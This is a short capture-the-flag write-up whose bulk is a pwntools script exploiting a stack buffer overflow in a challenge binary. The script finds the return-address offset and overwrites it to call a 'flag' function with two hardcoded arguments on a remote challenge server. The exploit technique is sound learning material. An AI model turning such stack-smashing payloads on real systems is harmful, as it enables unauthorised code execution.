we have an executable

Since it has no security measures we can smash the stack and return to any address we want.

The binary has an interesting function called `flag`
looking at the function, it needs to hardcoded parameters and then it prints the flag

```python
#!/usr/bin/env python2

# import all modules/commands from pwn library
from pwn import *

# set the context of the target platform
#  arch: i386 (x86 32bit)
#  os: linux
context.update(arch='i386', os='linux')

# create a process
elf = ELF('./vuln')
p = process('./vuln')
# send input to the program with a newline char, "\n"
#  cyclic(50) provides a cyclic string with 50 chars
p.sendline(cyclic(500))

# finding offset
p.wait()
core = p.corefile
stack = core.eip
offset = cyclic_find(stack)
print("OFFSET: ",offset)
# 2nd phase

p.kill()

 
c = remote('161.35.40.57',31064)
#c = process('./vuln')

padding = offset*asm('nop')
# addresses found using disassemble and search in gdb
flag = p32(elf.sym['flag'],endian='little')
payload = padding + flag + 4*b'a' + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")
c.sendline(payload)
c.interactive()
```
